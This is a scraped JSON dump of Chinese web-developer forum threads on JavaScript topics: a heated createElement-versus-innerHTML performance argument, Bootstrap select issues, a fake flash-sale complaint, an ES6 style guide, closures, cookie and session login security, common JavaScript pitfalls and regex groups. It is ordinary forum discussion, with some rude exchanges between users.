createElement是在内存中一个个创建元素，innerHtml接受一堆字符串，需要对字符串进行解析，哪一种效率高，不言而喻。\r", "\r", "react的本质也是在调用createElement这样的方法，只是他用jsx这种比较友好的方式，完成了对dom结构的描述。\r", "\r", "react是innerHTML？ 你能静下心来读读别人的文档么？不要不懂装懂。", "React", "\r", "\r", "小心变量冲突！\r", "\r", "h1('HTML Creation');\r", "\r", "p('Tags are functions.')\r", "\r", "p('Attributes are objects...', {\r", "  style:{fontStyle:'italic'}\r", "})\r", "\r", "ul(function(){\r", "  li('Nest');\r", "  li('with');\r", "  li('functions!');\r", "});", " 你的《不言而喻》不能让人信服，前提是浏览器傻乎乎的一个个解析然后createElement，但是实际上浏览器可能是对这段“html”进行编译优化。在c层面进行dom树构建反而比在js这边效率更高。\r", "js里一个一个createElement实际上没有给浏览器留下任何的优化余地。所以html大于一定长度，我猜是html效率更高，或者，未来肯定html效率更高", "模板引擎不仅可维护性远大于createElement，效率也比createElement要高，浏览器解析html字符串肯定不会傻到逐行createElement。用createElement创建出来的复杂html，几乎不可维护", " 你看源码就知道了。 ", "\r", "\r", "测试。再高级浏览器效率微乎其微。再旧式ie, html高", " 朱一有静下心来读了人家代码。", "jQuery自己就可以啊 $('<div>') 就是创建", "难道不是 cheerio ？\r", "不知道楼上在说的哪些是啥", "额 我错了 是前端 我不说了 模板库1万种\r", "推荐baidu etpl", "Google Closure?", "前端模板阿", " 没写过createElement就不要bb，你给的测试例子是循环使用createElement不断的添加dom借点\r", "\r", "有点经验的人都知道使用document.createDocumentFragment在内存中创建好所有dom元素，最后才添加到dom中。\r", "\r", "你猜什么效率高，你是个猪，你就知道什么效率高？ 操作内存不比浏览器自己解析字符串，然后根据字符串的含义，一个个创建的效率高？\r", "\r", "你能先看玩c++的书，再跟我bb？", " 性能差异微乎其微？好意思说出口？\r", "\r", "你看老外现在研究的前端框架，没什么人讨论jquery了吧？因为大家都会用了，现在要求精了\r", "\r", "react为什么这么多人用，难道不是因为别人的性能高？ react的开发成本比jquery可高多了\r", "\r", "\r", "假设你只要完成任务，ok你现在的技能足够了。假设你要做的性能好，远远不够。\r", "\r", "代码级别的性能就应该开始追求，那怕一点点。", " talk is cheap 。 我没研究过createElement，但是我学过编译原理。另外，如果没有linus的技术，就不要出口成脏", " ", "\r", "\r", "\r", "sb东西 性能高了40%   另外createDocumentFragment这个方法dom结构只会reflow一次\r", "\r", "作为一个程序员，天天写些垃圾代码，从不思考怎么提升代码性能，有什么用？", " 你既然知道reflow了，拿个 innerHtml+= 出来说少了40也不嫌丢人\r", "更适合模板引擎的case是这个，https://jsperf.com/innerhtml-vs-createelement-test/7\r", "另外即使是61这个case，我猜你肯定是用chrome，你敢把相同的代码放到edge，ie里试试吗\r", "作为一个程序员，我就不说维护性问题。除非你是写编译器的，不然能交给编译器优化的东西竟然自己优化，你确定你在思考怎么提高代码性能？", " 你是sb吗 你不知道手动操作内存，比自动的效率高很多吗。\r", "\r", "懒得和你当键盘侠了，你去问问做ios的 资深的  看 手动效率高 还是 自动高。。\r", "\r", "自动是因为程序员能力不足，人家给你一种舒服的方式，降低难度。\r", "\r", "真要做好的 还得是手动人工管理的东西。\r", "\r", "\r", "\r", "另外createElement相关方法是DOM 1 specification 里面就有的，也就是说ie6也是支持的。\r", "\r", "效率的提升同样适用，别拿你不知道的兼容性说事，你是做前端的吗？\r", "\r", "你是做开发吗，写过多少行代码，就研究编译器了？", " \r", "\r", "1. 都是innerHTML。 不管怎么样操作底层dom api。怎么着都比用react api。react再去调底层dom api来得快。看下源码就知道了，中间经过了多少函数，还有正则， 你完全被react的国内布道者把react魔化了。 react的性能好是针对比如angular这样（angluar的效率低是出了名的...）。react确实比angular快10倍以上。\r", "(vdom 确实比操作真实dom快，dom操作是很慢的。但是最后一步操作dom是跑不掉的。react快是快在中间 patch diff的过程。)\r", "\r", "2. 用react或者说用mvvm就是为了降低开发成本, 和模块化成本。\r", "\r", "3. 不是追究不追求效率的问题。我就说firefox createElement更快, chrome innerHTML更快, 那我该怎么办。然后过段时间，firefox把innerHTML速度也提升上去了。我又该怎么办。 都是dom低层api。优化是浏览器去做的。我们应该做的是提升上层的效率。还要注意你代码的gc，避免循环引用，提成可维护性。\r", "\r", "4. 不是外国的月亮就是圆的。国内的司徒大大的avlaon. 右大的vue都是写的很好的框架。至少代码写的要比react清晰易懂得多。并且效率也比angular快，整体体积还小。你要用一个东西，你需要评估你的需求，用最适合你的。如果市面上没有最适合你的，那么就需要自己造，所以就有那么多自己造轮子的。不是因为他们傻，是他们需要最适合自己的。上面我都说了。就比方出门打个酱油，是坐飞机呢，还是汽车呢，还是自行车呢，还是走路呢...\r", "\r", "5. 骂人不好。你自己都说静下心来看人家文档了。\r", "\r", "6. 这是朱一最后一次回复你在这个主题。因为跑题了。\r", "\r", "=================\r", "\r", "对于po主。对不起，说来些没用的。\r", "\r", "朱一的建议是看下你的需求。你需要拼很多有逻辑的模版么。\r", "如果逻辑分支很多。那么建议用模版引擎。\r", "如果没有逻辑。就直接innerHTML就行了。\r", "但是如果你不想写html，估计跑不掉了。如果你真的不想写html可以试试jade。 : )\r", "react？\r", "如果你想引入一个200多k的框架代码，并把之前用jquery的代码用react再重写一遍的话。可以试试玩玩。\r", "react还是挺有趣的。\r", "当你用一个东西的时候建议把他搞清楚他是怎么工作的，大部分的所谓的坑都是因为没有把它搞清楚造成的。", " “优化是浏览器去做的”\r", "\r", "行了，没别的了，你做的东西我明白了。\r", "\r", "\r", "楼主问这个问题说明他不是很清楚。这个时候他该使用bom的一些原生方法去渲染结构。\r", "\r", "只有经历过这些，才会思考，有没有更好的方法。怎样做更好。\r", "\r", "模版引擎是怎么实现的。他们有哪些差异...\r", "\r", "\r", "什么都不明白就直接开始用模版引擎，就跟你现在一样，对性能一无所知。\r", "\r", "就等着浏览器帮你优化。当然大多数应用不太需要这些性能的提升。\r", "\r", "\r", "但移动端或许需要，以及未来更多的智能设备。", " 你看有其他人来打你脸了， 你拿ios和js类比就知道你有多么”业余\",你知道托管代码和非托管的区别吗？js我可能说不上“精通”， 但是我知道交给dom api后，操作内存的是非托管代码，效率和js的操作是数量级的差别。\r", "ie6里的innerhtml效率比createElement高多了知道吗\r", "手动操作内存不一定比自动效率高，除非程序员真的知道他在写什么。现代语言的发展方向（rust等）有两种，一种是增加gc效率，一种是对程序员的增加约束，提高编译后的性能", "刚撸的，求围观\r", "  所有的编程语言里面的思想，理念都是相通的。只有你这样的sb才会觉得不能类比。\r", "\r", "你举得性能例子是为的举例而举例。\r", "渲染数据一般都是要渲染一些集合，是需要用到循环的。\r", "\r", "我举得例子是我实际开发经验中，经常碰到的，的确能提升性能的例子。\r", "\r", "你讲技术，讲不出个东西，一说到一些深的东西，你说你不清楚。\r", "\r", "你不清楚就不要装b，搞的好像你要在你不懂的领域装b，别人看不出你是个sb一样。", " 第一句前2/3句非常认同,最后的类比只能说你的见识还不够，同样的循环，交给js，php这样的语言，和交给底层去处理速度完全不同，js我不是非常熟悉，php的str_replace就是一个实例。\r", "模板引擎 自己createElement 肯定比不上把html交给浏览器，即使现在的结果是前者快（实际上对于ie，edge，chrome大部分情况都是后者快），那只能说浏览器优化还不够。\r", "你举的例子是指 ", " 这个吗，innerHtml+= 都用出来了还提什么40%\r", "我对我说出去的话负责，骂人的话我不接受只能显得你无趣。另外我回这么多不是想教育你，而是希望其他人不要被误导。", " 我说你这种sb能别在这里丢人现眼\r", "\r", "模板引擎自己createElement?\r", "\r", "这个方法是bom原生 浏览器自己实现的方法。\r", "\r", "国内东西做的垃圾就因为你这样不求甚解 敷衍鸟事。\r", "\r", "2b东西", " 到底谁在秀下限！上面别人也有评论你的，你就不反省下？", "  你跟我讲技术，我没听？\r", "\r", "你扯7扯8，只能显露你的无知，\r", "\r", "拜托你多百度一下，多学点东西。你以为前端就你想的那样，就你还能来看javascript代码？\r", "\r", "就你这样，对待知识一点不认真、不严谨，就在这里装b\r", "\r", "\r", "\r", "好的前端开发都是懂后台的，你写的那些东西，我不用看就知道是啥玩意。\r", "\r", "我上面说的知识点，你自己稍微百度一下，看看你自己是多无知。\r", "\r", "\r", "\r", "我这么无礼是因为我见不得对待知识不谦逊的人，就知道瞎放屁，一句都不在理。\r", "\r", "一行代码没写过，就来跟我讨论dom渲染性能。", " 我是写后端的，前段算是半调子。学c出身，略略研究过编译原理器虚拟机等。我从来不认为i前后段理念上有什么差异。我讲的只有一个意思，不要认为你的优化比浏览器聪明，你费劲心思createElement优化的方案比不上浏览器的一个优化手段，不如全部交给浏览器处理（实际上目前在微软系的浏览器里，innerhtml就是比createElement快）。比高性能代码更优秀的是可编译优化的代码。一个个createElement我看不出来有多少优化方案可以应用。", " 既然讨论技术，我也就谦虚点。\r", "\r", "我没有费尽心思优化。document.createElement是js里面一个比较基础的方法，是由各个浏览器厂商根据w3c的规范进行实现的。很早就有的方法。\r", "\r", "这个方法是在内存里面构建dom元素\r", "而innerHtml也是浏览器原生方法，但它接收字符串。\r", "\r", "添加dom节点的时候实际上是需要添加一个dom对象的\r", "createElement相当于在内存中描述好了这个对象，\r", "\r", "而innerHtml的字符串是需要浏览器自己解析字符串，并且构建dom对象的，相当于多了字符串解析的过程\r", "\r", "这个快慢还不明了?\r", "\r", "关于你上面提到的+=，你可以反推一下，这个符号重载的拼接字符串就算是慢，有可能慢40%吗，它真正的开销在于字符串解析\r", "\r", "我是一个比较较真的人，我喜欢研究技术。请用你理性的经验说服我。\r", "\r", "上面那个是女孩，她对性能不追求，不好强求，但作为一个认真的程序员，就算不写这样的代码，也应该知道哪些东西是真正能提升代码性能和质量的。", " innerHtml+= 慢不是重载的问题，而是innerHtml的赋值触发了dom树的重新构建。 createElement的函数调用，实际上最终都要调用浏览器本地代码，而这个调用过程是有开销的。浏览器内部就可以直接操作dom树。即使是字符串操作，浏览器内部解析必然比js快（因为js是无类型的，操作前需要判断类型，参照php的zval），何况解析HTML，浏览器那帮工程师费尽脑汁提高效率", "dom树都是需要构建的，不论怎么优化，至少是要构建1次的\r", "\r", "createElement方法的确繁琐，但你自己写浏览器的话，是不是既要开放繁琐高效的接口，又要提供便利的接口。\r", "\r", "字符串描述的是dom对象。中间需要转化\r", "\r", "你可能见过React.createElement这个方法\r", "facebook的工程师肯定是知道原生js有同名方法的，假设用法不同，理念不同，人家是不会用这个名字的\r", "\r", "为什么它不叫React.innerHtml?\r", "\r", "值得思考", "仔细推敲一下，你的思维认知是站不住脚的。\r", "\r", "+=触发了dom的reflow，与之比较的其他方法是否也进行了reflow？\r", "这里我断定reflow的时间成本是相同的。\r", "\r", "从数据结构上进行分析，你也知道dom是一个树形结构了。\r", "树形结构添加元素需要什么？节点\r", "\r", "createElement正好创建的就是节点。\r", "而innerHtml这个字符串对于树来说，没有任何意义。\r", "\r", "\r", "假设你的说法成立，innerHtml的效率比createElement的高。\r", "那么站在规则制定者的角度来说。同一个功能，有2种方法都能实现。\r", "而且其中一个方法效率优于另一个，且还最便捷。\r", "\r", "那是不是应该将效率低的方法标记为deprecated，日后慢慢的移除？\r", "w3c有这么做吗？\r", "\r", "\r", "\r", "从facebook工程师向createElement这一经典方法进行致敬，不难看出，\r", "这个方法的用法、理念将不断延续下去。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>页面上的样式是用bootstrap渲染的</p>\n\n<p>页面上有一个select<br>\n&lt;select id=\"assignModel-role\" class=\"form-control\" style=\"width: 200px;\"&gt;<br>\n &lt;option value=\"\"&gt;请选择...&lt;/option&gt;<br>\n&lt;/select&gt;</p>\n\n<p>里面的option是后台获取后通过jq动态添加的，类似这样：<br>\n$(\"#assignModel-role\").append(\"&lt;option value='\" + data.id + \"'&gt;\" + data.name + \"&lt;/option&gt;\");</p>\n\n<p>这样添加后bootstrap没有渲染新添加的内容，所以在下拉列表中就没显示，，，想请教一下如何解决</p>\n</div></div>"], "reply": "6", "tittle": "bootstrap 中 select 动态添加 option 的问题", "comment": ["后台返回的数据正确吗", "用bootstrap中的li标签代替select下拉框实现,另外试试看是不是后台返回数据没返回回来:\r", "class=\"dropdown-toggle\" data-toggle=\"dropdown\" role=\"button\" aria-expanded=\"false\"\r", "如果是ajax请求的,那么出题可能出在 请求方式的同步和异步上,这样的话应该设置同步.\r", "PS:这样的数据绑定,建议用angular处理,拼接代码维护起来是一件很糟糕的事情.", "没记错的话bootstrap的select用的是一个叫做select2的jquery插件，你看看这个插件的API", "F12 看一下有没有报错的地方，在 console 直接调试更直接；bootstrap 官网实测你的方法可用。\r", "\r", "js 修改了 DOM 浏览器就会重新渲染，不存在 bootstrap 不渲染的问题。", "我也很好奇，怎么会不渲染，bootstrap 的 select 下拉样式本来就是原生的啊，多半是你的代码写的有问题", "要么你用select2的异步加载方法，要么你ajax后执行$('select').select2()方法"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>秒杀时间到后就只是在上面盖了一个已抢光的png图片，我也是醉了。太假了</p>\n\n<p>url在这，大家可以去瞧瞧。。<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.hunliji.com/p/wedding/index.php/home/Activities/Main8_8\">http://www.hunliji.com/p/wedding/index.php/home/Activities/Main8_8</a></p>\n</div></div>"], "reply": "14", "tittle": "[吐槽]《婚礼纪》今天搞了个秒杀，瞄了一眼 JS，结果发现秒杀是骗人的。。", "comment": ["hhhh", "如果是我的话，即便是搞真的，我可能也会这么做，既然已经处于抢光状态，那就没必要不停的链接后端（尤其是数据库）查询数据了，直接来个图片得了。。。。", " 然而好像LZ的意思好像是js倒计时完了，根本不去查数据是否秒杀完，直接显示秒杀完。", " 嗯，是我片面了。。。。", "这个抢得活动就是假的。。提前有个class为qg的div，是已抢光那个状态的，等到时间到了display:block显示出来了。。", "以防被改，拉出来Mark下\r", " ", "源码被改了？\r", "是改了。我之前联系了他们客服来着。。现在去后台查了。\r", "现在18:00的商品后台查到还是会显示已抢完。。。\r", "\r", "还有个问题是我根本没有看到购买链接", " 被你们这些懂js的发现了，加个ajax蒙混一下，现已开启耍猴模式", "23333333  666666666", "我觉得会有\r", "《我就是hunliji的那个前端程序员》\r", "的帖子", "明明是个累瘫的程序猿糊弄老板写的, 你这么一搅和日子过不下去了", " 同是程序员，我错了-_-#!", "程序员何苦为难程序员"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>ES6(ECMAScript 2015) 编码规范与详细注意要点，结合广发证券大量ES6实践项目整理而成，已开源于Github中，持续更新中，欢迎PR以及提issue。 </p>\n\n<p>Github地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/gf-web/es6-coding-style\">https://github.com/gf-web/es6-coding-style</a></p>\n</div></div>"], "reply": "22", "tittle": "ES6(ECMAScript 2015) 编码规范与详细注意要点 (", "comment": ["好文！已Star！！", "模板字符串那个好和不好的示例出来的multiStr根本就不一样吧？", "顺便问下 你们前端团队大概多少人？", "贩卖style的没啥好结果", " Thx！ ^.^", " \r", "\r", "是写法的不同，后者换行由编译器转为\\n，若引号''直接换行则报错", " 目前有20人左右，有换工作的意向的话，欢迎投简历给我哈", " 算是一种参考与经验总结吧", "up", " 这里有一个。。", "不错…下波牛市去你们厂开户", " 不一样的，里面是把整块js相关的概念都揉进去，我们这边是分离出来的，另外也加了很多注意要点", " 感谢支持哈", "龙哥哥是不是在你们团队", " 哈，yulong？", "我想问一下 广发的官网为啥不改版重构", " 对的，哈哈，龙哥哥有玩v2没，git账号多少，我去粉一个", " 亲，正在重构哈，不久后就会推出了", " 我感觉用模板字符串的那个明显换行后多了好多空格啊……", " 因为示例代码的问题，已fix过，感谢。\r", "实际上我们这边一般是声明html模板变量用的", " 好像没玩v2哦，git在我们团队git上面有哈", "star +1"]},
{"content": ["<div class=\"topic_content\">能用简单的语言，讲明白这个特性，能带来什么么？引入他，和没有引入差别是什么？\r<br>有什么应用？如果不存在闭包，该如何实现闭包能办到的事情呢？</div>"], "reply": "13", "tittle": "如何去理解 JavaScript 的闭包？相比没闭包，有特什么别的差别？", "comment": ["作用域", "一句话：闭包可以避免全局变量的污染；有利于对变量的控制；\r", "其实闭包原理很简单的，就是开辟一个小的栈内存；也可以理解为，函数执行就是生成一个闭包(作用域)；\r", "但是闭包也有缺点：如果闭包外面有变量接收闭包内的引用类型返回值；那么这个作用域不销毁，浪费浏览器性能；（正常的闭包应该是运行过后，浏览器在空闲的时候销毁）", " 感谢", "JS没有class的概念,所以变量是全局的,很容易造成变量的污染,闭包的作用在于,闭包环境内,可以访问全局变量,在闭包环境里定义的变量,类似于class内定义的 private 变量,外部无法访问.", "我想请教个问题： es6 加入了 let 以后是不是就可以抛弃闭包了？", "wiki 的第一句话就解释的很清楚了 \r", "\r", "In programming languages, closures (also lexical closures or function closures) are a technique for implementing lexically scoped name binding in languages with first-class functions.", "闭包是一个自然而然的事情，并不需要刻意学习。", "加一条自己的理解：\r", "\r", "闭包，数学上解释，应该就是 “偏函数”，懂数学的人，到这里，用这个概念对照一下，应该秒懂。\r", "\r", "类似 z=f(x,y),z=f(x=6,y),可以传入一个x，等到返回的是一个关于x定值，一个关于y的函数，合适的时候，传入y，就可以求值了\r", "\r", "用途，就是延时计算，根据环境计算，有种动态的意味在里面", "如果没有闭包，在函数外部就无法访问函数里面的局部变量\r", "\r", "所以，闭包的两个作用就是：\r", "1. 实现访问控制 （读取函数内部变量）；\r", "2. 让一些变量始终保存在内存（利用这个特性时要记得手动释放）。", " 懒得查了，感觉你好懂，能顺便回答一下，如何手动释放么？", " ，手动释放的事，我个人感觉 @", " 想说的用该是闭包内，有引用数据类型的变量声明时，当这个变量已经没用的时候，在return前；手动把null 赋给这个值；\r", "举个例子，可能更容易说明；好比你在写某个函数的时候，函数里需要借用一个数组来协助处理数据；开始写了一句var arr=[];用完后记得要手动写一句 arr=null;", " THX~", " 你举的例子是函数的科里化，不是闭包，这个要注意，帮你纠正一下。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网站希望改成后端只输出json，前端全部ajax请求的模式，也包括登录，那么问题来了</p>\n\n<p>前端这块，用户登录后，登录信息只能保存在cookies里，到期清空，安全性实在是低，有什么好办法吗？</p>\n</div></div>"], "reply": "37", "tittle": "cookies 登录的安全问题", "comment": ["oauth2.0\r", "\r", "ssl也有必要.\r", "\r", "应该没什么太大问题了吧。", "大多session也是基于cookie。\r", "\r", "如果是非浏览器客户端，或者oauth，每个访问都需要access_toke，其实原理跟cookie差不多。", "现在所有的认证手段除硬件认证外，都是基于cookie的，怎么会不安全。但在cookie的设计上要防cookie盗用，并兼顾用户跟踪。", "没有ssl的话可以考虑淘宝以前的做法，一段时间无用户活动可以提示用户重新登录", "有效期 httponly 加密 就可以了", "前后端分离，一般就不用cookie来保证用户认证登录了（比如 native app情况下），一般是基于 token或者 oauth，前者实现更简单点。token （hash）的话，一般是用户通过某种方式认证登录（比如基于https的 http basic 登录），然后返回一个token给用户，以后每次请求都必须带上token进行授权。", "后端对重要操作二次询问密码，例如查看身份信息，改密码，加密保之类\r", "如果什么操作都重要，那就不该cookies登录", "我们是前端ajax提交到后台，保存到session中的。从来木有用过cookie，都是用session的···", " session 是哪来的？", " 有区别么。。。", " session的id就是保存在cookie中的。。。。", " cookie机制采用的是在客户端保持状态的方案，而session机制采用的是在服务器端保持状态的方案", "cookie 和session 的区别：\r", "\r", "1、cookie数据存放在客户的浏览器上，session数据放在服务器上。\r", "\r", "2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗\r", "   考虑到安全应当使用session。\r", "\r", "3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能\r", "   考虑到减轻服务器性能方面，应当使用COOKIE。\r", "\r", "4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。\r", "\r", "将登陆信息等重要信息存放为SESSION\r", " 其他信息如果需要保留，可以放在COOKIE中", " 然而 session 要通过 cookie 传递的亲……session id 是在 cookie 里的，id 所对应的 data 才是在服务器上..用着 session (基本)就得用 cookie..", "JWT: ", " cookie是不用写的，用了session，自动在客户端生成的吧。就是觉得登陆信息就应该用session。", " 木有专业前端，前后都做的伤不起呀。。。", " 确实有不用 cookie 传递 session 的办法，可以用 HTTPS Session 传递 Session，可以用 ETags 借助浏览器缓存传递 session，可以用 URL 传递 session，然而 OAuth 以外 99% 以上的 session 都是通过 cookie 传递的…\r", "\r", "TCP 自身是无状态的，总要有个地方「持久化记录」一个唯一标示符，浏览器提供的「可以让服务器在客户端保存一段信息以供后续使用」的这个功能叫做 Cookie。\r", "\r", "不信你清空 v2ex 上的 cookie 试试..看看 session 是不是丢失了", " typo：<del>TCP</del> HTTP 自身是无状态的", " 安全上没什么区别，我既然能伪造cookie保存的登录信息伪造登录，当然也能伪造sessionid伪造登录，反正你要有个信息来源于客户端不是", " 现在不是流行全栈吗:D", "首先，cookie 与 session 是息息相关的，session的标识是通过 cookie 的固定 key获取，比如 session_id 或者 jsession_id 等等，现在很多框架都会帮你实现隐藏的 session 功能。但实际上，在标准的HTTP协议上，根本没有我们所谈论的 session，session 是基于 cookie 的一种HTTP状态维持实现(RFC2109)\r", "\r", "其次，在很多精简的后端框架，压根是没有session这个东西，需要实现session，需要自己去写cookie，并且需要自己去序列化session信息保存，比如使用数据库，使用文件，使用缓存等等。而且写入cookie的key可以是你自己定义的任何值，比如 access_token、auth_token、abc或者任何你喜欢的\r", "\r", "然后，最近我们做了一个项目，是完整的前后端分离，使用的方法是使用token验证，而且涉及到不同后端应用的反向代理，实现一个分布式的 session 不太现实，我们要求各后端应用的设计各自实现自己的类session状态维持，但实际上，这种设计是不合理的，http的优势反而是无状态。\r", "\r", "最后，关于安全问题，除了增加无操作超时机制、多重验证的手段外，最能够防止 cookie 劫持的方法是使用 https。\r", "\r", "希望以上信息对你有用。", "建议session用redis来做，后面做负载也不用考虑session共享的问题", "抱歉，没看清楚是网站，惯性以为是app的", "session的数据是存放在服务端的，但是session ID是写在cookies的。\r", "最简单提升安全度的方式自然是SSL，这样你的session ID就不会被人抓到了。", " \r", "https可以防止cookie劫持，但是考虑极端一点，如果别人可以使用你的浏览器，把cookies记录下来，这样是可以伪造cookies进行登录的吧。如果session设置超时自动销毁还好，但是许多地方都有记住密码功能，用户状态是长期保存的，这样的网站如果伪造了cookies是可以一直保持登录的吧", "大多数网站登录信息保存都和cookie相关，只是说看你登录信息如何保存了，自己想一套token验证机制用cookie实现还是比较安全的，遇到cookie劫持另说。 没有绝对安全的系统。", "首先 session 没有比 cookie 安全。\r", "\r", "下面都是一般的情况，安全要一步步来嘛：\r", "\r", "现在基本都是 ajax 做基本的前后端分离，用 session 的话和以前没什么区别（所有的接口验证 session）。session_id 通过 cookie 传递（httponly），你网页上的恶意脚本无法获取到 session_id，但抓包的话还是可以看见 session_id，这是时候 https 就登场了，在证书安全的情况下别人是无法获取你的 cookie 的（至于能获取到什么这个不清楚，求大神赐教）。\r", "\r", "楼主你是要在 cookie 里面存什么登录信息呀？一般的做法是存一个加密后的 “token”，这个 token 是有时效性的，可以在服务端反解出用户id/用户名。其实和 session 机制类似，这样做的好处就是统一认证接口，各个端、各个产品线、各个开发语言都可以用。当然还是不能防止别人复制你的 token 干坏事，请搜索关键词：CSRF 攻击。\r", "\r", "cookie、session 的问题至少还可以说 10 年，并不是一句“cookie 保存在客户端，session 保存在服务端”能解释清楚的。", "登录注册都交给后台   cookie也是后台设置  httponly    退出登录都是交给后台清cookie", " 有个问题，你的session怎么和用户对应起来，不还是客户端的cookie中的某个值来找到对应的session？", "看有些回复似乎对 cookie 和 session 概念不是很清楚，我的理解是 session 和 cookie 根本是两个不同层次的概念，可很多文章非要把这两放在一起对比来说混淆读者。\r", "\r", "cookie 是与 http 协议和浏览器实现标准相关的一部分，cookie 和 http 头部的其它http头字段差不多，而 session 是服务器维持用户状态的一种机制，它对于 http 协议和浏览器来说是透明的，它们并不知道 session 的存在。\r", "\r", "由于http是无状态的，必须采取一种机制来追踪用户状态，session 的概念是这个，session 可以用不同的方式来实现，对 web 来说绝大部分情况都是用 cookie 来实现的，也有一些小众做法是在 url 上加 session id，或者在页面里加上个隐藏表单，session 实现的本质都是一样的，请求必须带上一个标识用户的信息，只不过在大部分情况下，这个信息都放在 cookie 中。", "一般情况下都是session要依靠cookie保持的，比如jsessionid的那个cookie，马德好多教材都不说明这个", "可以看一下JSON Web Token这个解决方案", " 能使用你的浏览器已经属于社会工程的安全入侵问题，也不是服务端的设计能控制得来；无论session还是cookie还是token，在实际生产中都会控制超时，https只是提升安全系数，不是杜绝安全隐患。安全不是一方做得万无一失就高枕无忧，就好像，银行安全系数再高，被别人偷看了密码还是能把钱取出来是一个道理", "jiaozi 是来赚@的，大家绕道！ ：）\r", "\r", "如同 @", " 所说，大部分session是需要cookie支持的，这也是最方便的一种。", "你要这么想，淘宝、FaceBook、Google也还是用 Cookie 来保存用户状态...", "  为什么没有区别？你是指都是通过客户端传递某一种信息（cookie或者token）来是识别用户吗？ 你伪造的途径是什么？（通过破解用户密码？）不管怎么样用户都得通过用户密码登录，如果这些信息泄露了，不管用什么方式都在根本上解决不了这样的安全问题的。当然我们只能预防这种情况，比如提供密码复杂度，限制api访问频次 etc。采用 session（cookie）一般是基于浏览器的做法，采用token一般app用的比较多。"]},
{"content": "", "reply": "37", "tittle": "[收集贴] 晒晒你知道的 JavaScript 的那些坑……", "comment": ["JavaScript引擎在行末自动添加分号的机制,产生的坑\r", "\r", "如果你想的是这样子的代码：\r", "\r", "function foo() {\r", "    return { name: 'foo' };\r", "}\r", "\r", "如果你不小心，多了换行了，像这样\r", "或者这就是你心目中的“多行代码”的样子\r", "\r", "function foo() {\r", "    return\r", "        { name: 'foo' };\r", "}\r", "\r", "\r", "其实会变成：\r", "\r", "function foo() {\r", "    return;\r", "        { name: 'foo' };\r", "}\r", "\r", "\r", "正确的姿势是：\r", "\r", "function foo() {\r", "    return { // 这里不会自动加分号，因为{表示语句尚未结束\r", "        name: 'foo'\r", "    };\r", "}", "数值精度不够，服务器返回的long类型的id会丢失精度，导致错误。最好直接使用String类型传数据。", "Date", " 十分感谢", "**@RoshanWu** thanks", " Chrome 的 Date 和 IE 的 Date 严谨程度不同，的确坑\r", "\r", " return 从来都不应该与它要返回的值分成两行写", "for 循环中的 closure 有问题，比如：\r", "\r", "for (var i in elements) {\r", "  var element = elements[i];\r", "  doSomething(element, function() {\r", "    console.log(element.name);\r", "  }\r", "}\r", "\r", "log 出来永远是最后一个。", " 必須這個Closure坑.", " 这其实不能算 Closure 的坑，是 JavaScript 早期版本没有块级作用域的坑，如果用 strict mode 里的 let element = elements[i]，就不会有这个问题。", "nodejs的parseInt(\"000300\")，猜猜结果是什么？", "还有值拷贝的坑", " 这不是问题吧……这不是 feature 么……", "各种坑……以及各种坑我自己造的工具……\r", "['10', '10', '10'].map(parseInt)", "好像js的正则不支持零宽断言", " 0.00300?\r", " == === != !== null undifine", "(Num).toFixed(n) 居然返回的是字符串", "哪里坑了？ 自动追加分号，这么好的功能。\r", "\r", "没看到老外现在代码，好多都不加分号了。\r", "\r", "不加分号的代码看着舒服多了啊。\r", "\r", "\r", " 也不支持命名分组", " \r", "\r", "你不知道parseInt有第二个参数，以及map会给callback三个参数，那一定会坑 /w\\", "0.1+0.2==0.3", " 8进制的？", " \r", "这个是大坑啊。。。计算精度问题，", "如果了解javascript解析/编译原理，就不会有这些问题。原理读得太少，上手就是操作，等发现问题了就把这些归类为坑。", "[1,2,3].map(parseInt) //=> [ 1, NaN, NaN ]\r", "\r", "[1,2,3].map(function(x){return parseInt(x);}) //=> [ 1, 2, 3 ]", " 我记得有下在搞monngoose 时，返回的结果是Document类型，直接赋值一个变量时，再修改里的的元素是失效的，这个算是 值拷贝的问题吗？", " 0.1+0.2==0.3返回false不是js独有的坑呀，这是二进制无法精确表示小数导致的，C语言也有这个坑，PHP也有，Python也存在。", "<a href=\"http://stackoverflow.com/questions/4886632/what-does-var-that-this-mean-in-javascript\">this that ... </a>", " 原来如此！", " 浮点器是什么原理都要深究很久吧，计算机发展也就酱紫了。", "拷贝对象时，JSON.parse(JSON.stringify(obj))比较蛋疼\r", "JSON.stringify 用在 map上面会输出为 []， 直接打印能显示出来", " 不说还真不知道。现在这就是讨论“坑”，我这个是从某个国外的演讲里面看过的", "JavaScript排序坑\r", "会把数字先转换为字符串，再用字符串去排序\r", "……\r", "反人类\r", " ", "补充楼上，高清图片url:\"", " \"\r", "\r", "具体描述 廖雪峰JavaScript教程，sort篇\r", "Json.stringify ()会默认忽略 undefined 的 key"]},
{"content": ["<div class=\"topic_content\">看了一下书的介绍，复杂的正则表达式引入圆括号以后，我就开始觉得找不到它的逻辑了\r<br>所以我相当于现在对正则表达式这里最基本的东西都没弄清楚\r<br>比如match函数什么时候返回一个值，什么时候返回多个值？是怎么去匹配的？\r<br>圆括号的意义不是固定一个子表达式整体？\r<br>\r<br>\"abcd\".match(/ab|cd/)\r<br>[\"ab\"]\r<br>\"abcd\".match(/(ab|cd)/)\r<br>[\"ab\", \"ab\"]\r<br>\"abcd\".match(/(ab|cd)+/)\r<br>[\"abcd\", \"cd\"]\r<br>\"abcd\".match(/ab|(cd+)/)\r<br>[\"ab\", undefined]\r<br>\"abcd\".match(/ab+|cd+/)\r<br>[\"ab\"]\r<br>\"abcd\".match(/(ab)+|cd+/)\r<br>[\"ab\", \"ab\"]\r<br>\"abcd\".match(/ab|(cd)+/)\r<br>[\"ab\", undefined]\r<br>\r<br>正则表达式有没有哪里有写的比较易懂的文档可以学习？\r<br>\r<br>谢谢。</div>"], "reply": "12", "tittle": "学习 javascript 的正则表达式，看到圆括号这里以后我深深的疑惑了", "comment": ["\r", "\r", "\r", "拿去", "建议楼主去玩一下regex golf\r", 